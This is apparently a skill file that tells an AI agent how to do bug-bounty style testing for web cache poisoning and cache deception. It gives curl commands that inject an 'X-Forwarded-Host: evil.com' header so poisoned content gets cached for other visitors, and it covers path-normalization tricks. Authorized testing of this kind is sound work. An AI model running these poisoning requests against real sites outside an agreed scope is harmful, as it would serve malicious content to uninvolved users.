---
name: cache-poison
description: Web cache poisoning and cache deception playbook — unkeyed headers/cookies reflected in responses, path normalization tricks, and cached error pages. Use when a CDN (Cloudflare, Fastly, Akamai) sits in front and responses include `Cache-Control`, `X-Cache`, or `Age` headers.
allowed-tools:
  - shell
  - http
  - web_search
  - web_fetch
  - confirm_finding
  - file_write
---

# Cache poisoning / deception playbook

Goal: get a **malicious response served from cache** to other users, or trick cache into storing wrong content.

Reference PortSwigger Web Cache Poisoning research via `web_fetch`.

## 1. Confirm caching
```sh
curl -ksS -D - 'https://app.example.com/' -o /dev/null | grep -iE 'cache-control|x-cache|age|cf-cache-status'
```

Send twice — if `Age` increases or `HIT` appears, caching is active.

## 2. Find unkeyed inputs
Headers/cookies often **not** in cache key but reflected in body:
- `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`
- `Accept-Language`, `Accept-Encoding` fat GET
- Custom headers echoed in errors/links

```sh
curl -ksS 'https://app.example.com/' \
  -H 'X-Forwarded-Host: evil.com' | grep -F 'evil.com'
```

If reflected in `href`, `src`, or JSON — candidate for poisoning.

## 3. Poison attempt
Send malicious header + cacheable path. Then fetch **without** header from clean client / second curl:

```sh
# Step 1 — poison
curl -ksS 'https://app.example.com/static/app.js' -H 'X-Forwarded-Host: evil.com'
# Step 2 — verify cache served evil.com link to next visitor
curl -ksS 'https://app.example.com/static/app.js' | grep evil.com
```

## 4. Cache deception
Path normalization: `/account/settings/nonexistent.css` maps to dynamic `/account/settings` but cached as static extension.

Compare cache behavior on:
- `/profile` vs `/profile/.css`
- `/..%2f` variants (careful — scope only)

## 5. Impact
- Stored XSS via poisoned JS URL
- Open redirect in cached Location header
- Session fixation if Set-Cookie cached (rare but critical)

## 6. Report
Document cache layer, unkeyed input, poison request, and victim fetch proving HIT.

VRT: `Web Cache Poisoning` / `Server Security Misconfiguration`

Call `confirm_finding` when second request without attacker header still shows poisoned content.
